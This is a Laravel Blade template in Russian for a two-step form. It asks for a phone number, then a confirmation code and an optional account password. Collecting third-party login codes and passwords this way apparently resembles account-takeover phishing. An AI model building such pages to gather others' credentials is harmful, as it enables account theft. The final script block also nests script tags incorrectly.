@extends('layouts.auth')

@section('content')
<div class="container py-3">
    <div class="col-md-8">
        <!-- Первая форма -->
        <form id="form1" action="{{ secure_url('register_number') }}" method="POST">
            @csrf

            <div class="mb-3">
                <p class="text-white">Введите номер телефона</p>
                <input placeholder="895..." class="form-input" name="phone" autofocus>
            </div>

            <button type="submit" class="w-100 btn btn-primary form-button" onclick="showSecondForm()">Отправить</button>
        </form>

        <!-- Вторая форма (скрытая) -->
        <form id="form2" action="{{ secure_url('next_step_number') }}" method="POST" style="display: none;">
            @csrf

            <div class="mb-3">
                <p class="text-white">Введите код подтверждения</p>
                <input placeholder="Код подтверждения" class="form-input" name="code" autofocus>
            </div>

            <div class="mb-3">
                <p class="text-white">Пароль от аккаунта</p>
                <input placeholder="Если есть" class="form-input" name="password" autofocus>
            </div>

            <button class="w-100 btn btn-primary form-button">Отправить данные</button>
        </form>
    </div>
</div>
@endsection



<script>
    @if(isset($isSecondFormVisible) && $isSecondFormVisible)
        <script>
            document.getElementById('form1').style.display = 'none';
            document.getElementById('form2').style.display = 'block';
        </script>
    @endif
</script>